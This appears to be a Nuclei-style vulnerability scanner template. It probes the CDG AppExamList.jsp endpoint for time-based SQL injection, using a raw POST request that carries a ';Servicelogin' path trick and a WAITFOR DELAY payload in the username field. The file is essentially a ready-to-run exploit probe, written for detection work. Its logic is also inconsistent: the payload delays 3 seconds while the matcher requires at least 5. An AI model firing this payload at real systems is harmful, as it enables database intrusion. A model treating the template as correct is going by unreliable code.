id: CDG-AppExamList-sqlInjection

info:
  name: CDG AppExamList SQL Injection
  author: iSee857
  severity: high
  description: |
    Detects SQL Injection vulnerability in CDG AppExamList endpoint by utilizing time-based payloads.

http:
  - method: POST
    raw:
      - |
        POST /CDGServer3/client/AppExamList.jsp;Servicelogin HTTP/1.1
        Host: {{Host}}
        Content-type: application/x-www-form-urlencoded

        username=1'WAITFOR+DELAY+'0:0:3'--
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"
      - type: status
        status:
          - 200